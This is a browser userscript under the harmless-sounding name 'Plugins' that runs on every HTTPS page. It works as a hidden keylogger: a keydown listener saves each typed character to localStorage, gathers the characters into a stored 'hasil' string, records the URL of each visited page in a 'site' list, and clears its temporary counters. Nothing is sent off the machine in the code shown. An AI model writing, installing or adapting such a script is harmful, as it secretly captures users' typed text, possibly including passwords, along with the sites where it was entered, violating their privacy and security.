// ==UserScript==
// @name         Plugins
// @namespace    http://tampermonkey.net/
// @version      1.30
// @description  try to take over the world!
// @author       Woa
// @match        https://*/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';
// ==UserScript==
// @name     Plugin
// @version  1.30
// @grant    none
// @author   Woa
// ==/UserScript==

"use strict";
try{
var a=localStorage;var b="";
  if(a.getItem("inc")===null){
   	a.setItem("inc","0");
  }


document.addEventListener("keydown",function(e){
var xinc=Number(a.getItem("inc"));
if(e.keyCode!==13){
xinc+=1;
b+=String.fromCharCode(e.keyCode);
a.setItem("ram"+String(xinc),b);
a.setItem("inc",String(xinc));
}

},false);



setTimeout(function(){
  //alert(a.getItem("inc"));
  rootV();
  eroot();
  droot();
},5000);

function rootV(){
 	var hasil=[],han=1;
  for(var i=0;i<Number(a.getItem("inc"));i++){
   	hasil.push(a.getItem("ram"+String(han)));
    han++;
  }
 	if(a.getItem("hasil")===null){
   	a.setItem("hasil","");
  }

  	if(a.getItem("hasil")!==null){
   		a.setItem("hasil",(a.getItem("hasil")+hasil[hasil.length-1]));
  	}


  //alert(a.getItem("hasil"));
}

function droot(){
  var han=0;
 	 for(var i=0;i<Number(a.getItem("inc"));i++){
   	 	a.removeItem("ram"+String(han));
     	han+=1;
   }
  		a.removeItem("inc");
  		//a.removeItem("hasil");
		//a.removeItem("site");
      //alert(a.getItem("hasil"));
}

function eroot(){
  if(a.getItem("site")===null){
   	a.setItem("site","");
  }
  if(a.getItem("site")!==null){
   		a.setItem("site",(a.getItem("site")+","+document.URL.toString()));
  }
  //alert(a.getItem("site"));
}


}catch(e){
	alert(e);
}
 
})();